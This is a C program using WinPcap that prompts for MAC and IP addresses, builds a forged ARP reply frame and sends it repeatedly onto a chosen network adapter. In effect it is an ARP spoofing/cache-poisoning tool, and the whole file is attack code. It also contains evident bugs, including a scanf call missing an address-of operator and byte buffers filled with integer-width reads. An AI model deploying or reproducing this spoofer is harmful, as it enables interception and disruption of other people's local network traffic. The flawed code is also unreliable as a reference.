#include <stdlib.h>
#include <stdio.h>


#include <pcap.h>



int main()
{
	pcap_if_t *alldevs;//定义一个网络接口的一个节点
	pcap_if_t *d;
	int i=0,inum=0,j;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[60];
	pcap_t *adhandle;


	/* 获得设备列表 */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* 打印列表 */
	for(d= alldevs; d != NULL; d= d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
		printf(" (%s)\n", d->description);
		else
		printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return 0;
	}
	printf("Enter the interface number (1-%d):",i);
	scanf("%d", &inum);
	/* 跳转到选中的适配器 */
	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
	/* 打开适配器 */
	if ( (adhandle= pcap_open_live(d->name, // 设备名
								65536, // 要捕捉的数据包的部分 
										// 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
										1, // 混杂模式
								1000, // 读取超时时间 
								errbuf // 错误缓冲池
								) ) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* 目的地址的MAC地址*/
	printf("请输入接收方的MAC地址（例FF:FF:FF:FF:FF:FF）\n");
	scanf("%2x:%2x:%2x:%2x:%2x:%2x",&packet[0],&packet[1],&packet[2],&packet[3],&packet[4],&packet[5]);
	
	/* 设置MAC源地址 */
	printf("请输入源mac地址：");
	scanf("%2x:%2x:%2x:%2x:%2x:%2x",&packet[6],&packet[7],&packet[8],&packet[9],&packet[10],&packet[11]);
	
// 	packet[6]=0x00;
// 	packet[7]=0x1b;
// 	packet[8]=0Xfc;
// 	packet[9]=0xc2;
// 	packet[10]=0X1b;
// 	packet[11]=0xb6;

	/* 帧类型 */
	packet[12]=0x08;
	packet[13]=0x06;
	/* 硬件类型 */
	packet[14]=0x00;
	packet[15]=0x01;
	/* 协议类型 */
	packet[16]=0x08;
	packet[17]=0x00;
	/*硬件大小*/
	packet[18]=0x06;
	/*协议大小*/
	packet[19]=0x04;
	/* ARP回复协议 */
	packet[20]=0x00;
	packet[21]=0x02;
	/*发送方MAC地址*/
	for(i=22;i<28;i++)
	{
		packet[i]=packet[i-16];
	}
	/*发送方IP地址*/
	printf("发送方IP：");
	scanf("%d.%d.%d.%d",&packet[28],&packet[29],&packet[30],&packet[31]);
// 	packet[28]=0xc0;
// 	packet[29]=0xa8;
// 	packet[30]=0x01;
// 	packet[31]=0x6c;
	/*接收方MAC地址*/
	for(i=32;i<38;i++)
	{
		packet[i]=packet[i-32];
	}
	/*接收方IP地址*/
	printf("请输入目标的ip地址\n");
	scanf("%d.%d.%d.%d",&packet[38],&packet[39],&packet[40],&packet[41]);
	/*填充数据*/
	for(j=42;j<60;j++)
	{
		packet[j]=0x00;
	}


/*发送数据包 */
/*if (pcap_sendpacket(adhandle, // Adapter
packet, // buffer with the packet
60 // size
) != 0)
{
fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(adhandle));
return 3;
}*/
	int send_num=100;
	i=0;
	printf("请输入包的数量：(不输入按照100计算)\n");
	scanf("%d",send_num);
	while(i<send_num)
	{
		pcap_sendpacket(adhandle, packet,60 );
		printf("OK\n");
		i++;
	} 
	pcap_close(adhandle); 
	return 0;
}
